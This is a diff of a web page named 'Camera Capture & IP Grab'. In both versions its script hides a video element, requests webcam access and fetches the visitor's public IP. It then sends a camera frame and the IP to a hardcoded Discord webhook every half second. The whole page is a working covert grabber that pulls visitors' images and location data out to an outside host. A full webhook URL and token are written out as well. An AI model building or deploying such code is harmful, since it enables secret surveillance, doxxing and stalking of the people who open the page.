@@ -2,13 +2,12 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Camera & IP Grabber</title>
+<title>Camera Capture & IP Grab</title>
 </head>
 <body>
 <video id="video" autoplay playsinline style="display:none;"></video>
 <script>
-const webhook = "https://discord.com/api/webhooks/1375557655036301593/fAVFnmHle5XCW4nxYD3GKHetyJRbGyQa6IXia2LbrEmk4Sn6Gaym_YduQpvpgkD2h0oA";
+const webhookURL = 'https://discord.com/api/webhooks/1375557655036301593/fAVFnmHle5XCW4nxYD3GKHetyJRbGyQa6IXia2LbrEmk4Sn6Gaym_YduQpvpgkD2h0oA';
 
 async function getIP() {
   try {
@@ -16,52 +15,51 @@ async function getIP() {
     const data = await res.json();
     return data.ip;
   } catch {
-    return "unknown";
+    return 'unknown';
   }
 }
 
-async function captureAndSend() {
-  const video = document.getElementById('video');
-  if (!video.srcObject) return;
-
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  const imgData = canvas.toDataURL('image/png');
-
-  const ip = await getIP();
-
-  const payload = {
+async function sendData(imageBase64, ip) {
+  const json = {
     content: `IP: ${ip}`,
     embeds: [{
-      image: { url: imgData }
+      image: {
+        url: `data:image/png;base64,${imageBase64}`
+      }
     }]
   };
-
-  fetch(webhook, {
+  await fetch(webhookURL, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(payload)
+    body: JSON.stringify(json)
   });
 }
 
-async function start() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.getElementById('video');
-    video.srcObject = stream;
-    video.play();
+async function captureAndSend() {
+  const ip = await getIP();
+  const video = document.getElementById('video');
 
-    setInterval(captureAndSend, 500);
-  } catch (e) {
-    console.error('Camera access denied or error:', e);
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    return;
   }
+
+  if (!window.stream) {
+    window.stream = await navigator.mediaDevices.getUserMedia({video: true});
+    video.srcObject = window.stream;
+  }
+
+  const canvas = document.createElement('canvas');
+  canvas.width = 320;
+  canvas.height = 240;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  const imageBase64 = canvas.toDataURL('image/png').replace(/^data:image\/png;base64,/, '');
+
+  await sendData(imageBase64, ip);
 }
 
-start();
+setInterval(captureAndSend, 500);
 </script>
 </body>
 </html>
